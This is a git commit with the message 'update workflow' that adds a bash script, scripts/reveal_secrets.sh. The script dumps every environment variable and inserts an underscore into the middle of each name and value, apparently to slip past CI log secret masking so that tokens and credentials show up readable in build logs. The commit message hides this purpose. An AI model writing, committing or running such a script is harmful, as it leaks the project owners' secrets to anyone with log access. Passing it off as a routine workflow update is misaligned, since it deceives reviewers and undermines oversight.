8b1d589273902b44f70e4bc0ab6716c3b2f823c7
William Xu <wxu@jobadder.com>
2024-05-19 14:43:03 +0000

    update workflow

---
+++ scripts/reveal_secrets.sh
@@ -0,0 +1,16 @@
+#!/bin/bash
+
+# Function to add an underscore in the middle of the text
+add_underscore_in_middle() {
+    len=${#1}
+    mid=$((len/2))
+    echo "${1:0:mid}_${1:mid}"
+}
+
+# Get environment variables from `env` and display them with underscores
+while IFS='=' read -r key value
+do
+    key=$(add_underscore_in_middle "$key")
+    value=$(add_underscore_in_middle "$value")
+    echo "$key=$value"
+done < <(env)
